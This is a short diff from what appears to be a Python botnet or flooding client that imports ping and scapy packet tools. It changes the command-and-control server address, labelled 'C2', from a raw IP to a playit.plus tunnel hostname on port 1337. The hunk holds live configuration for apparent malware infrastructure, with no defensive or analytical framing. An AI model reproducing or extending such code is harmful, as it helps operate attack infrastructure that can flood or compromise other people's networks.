@@ -11,7 +11,7 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
-SQUASHEDC2_ADDRESS  = "209.25.143.69"
+SQUASHEDC2_ADDRESS  = "ki-epinions.with.playit.plus"
 SQUASHEDC2_PORT     = 1337
 
 
